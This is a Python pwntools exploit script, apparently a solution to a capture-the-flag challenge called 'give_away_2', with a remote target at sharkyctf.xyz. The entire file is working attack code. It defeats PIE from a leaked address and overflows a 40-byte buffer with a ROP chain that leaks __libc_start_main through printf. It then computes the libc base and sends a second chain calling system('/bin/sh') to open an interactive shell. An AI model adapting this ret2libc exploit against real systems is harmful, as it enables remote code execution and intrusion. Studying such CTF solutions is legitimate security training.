from pwn import * 

def main():

	local = 1

	if local:
		p = process("./give_away_2") 
		libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	else:
		p = remote("sharkyctf.xyz",20335)
		libc = ELF("./libc-2.27.so")

	elf = ELF("./give_away_2")

	out = p.recvline().strip().split(' ')
	print(out)
	MAIN = int(out[2],16)

	base_prog = MAIN - 0x864 


	PRINTF = elf.plt['printf'] + base_prog #0x690 + base_prog
	LIBC_START_MAIN = elf.symbols['__libc_start_main']  + base_prog

	POP_RDI = 0x0000000000000903 + base_prog
	POP_RSI = 0x0000000000000901 + base_prog
	RET = 0x0000000000000676 + base_prog

	log.info("PRINTF@plt: " + hex(PRINTF))
	log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
	log.info("pop rdi gadget: " + hex(POP_RDI))

	#Overflow buffer until return address
	padding = "A"*40

	# Create rop chain

	#rop1 = padding + p64(POP_RDI) + p64(dummy_msg) + p64(RET)+ p64(POP_RSI) + p64(LIBC_START_MAIN) + "B"*8 + p64(RET) + p64(PRINTF) + p64(MAIN)
	rop2 = padding +p64(POP_RDI) + p64(LIBC_START_MAIN) + p64(RET) + p64(PRINTF) + p64(RET)+p64(MAIN)
	p.sendline(rop2)

	# Parse leaked address


	recieved = p.recvline().strip().split('Give')
	print(recieved)
	leak = u64(recieved[0].ljust(8, "\x00"))
	log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))


	# Send payload

	libc.address = leak - libc.sym["__libc_start_main"]
	log.info("Address of libc %s " % hex(libc.address))

	BINSH = next(libc.search("/bin/sh")) 
	SYSTEM = libc.sym["system"]

	log.info("bin/sh %s " % hex(BINSH))
	log.info("system %s " % hex(SYSTEM))

	final_rop = padding + p64(RET) + p64(POP_RDI) + p64(BINSH) +p64(SYSTEM)

	p.sendline(final_rop)
	p.interactive()

	p.close()


if __name__ == "__main__":
    main()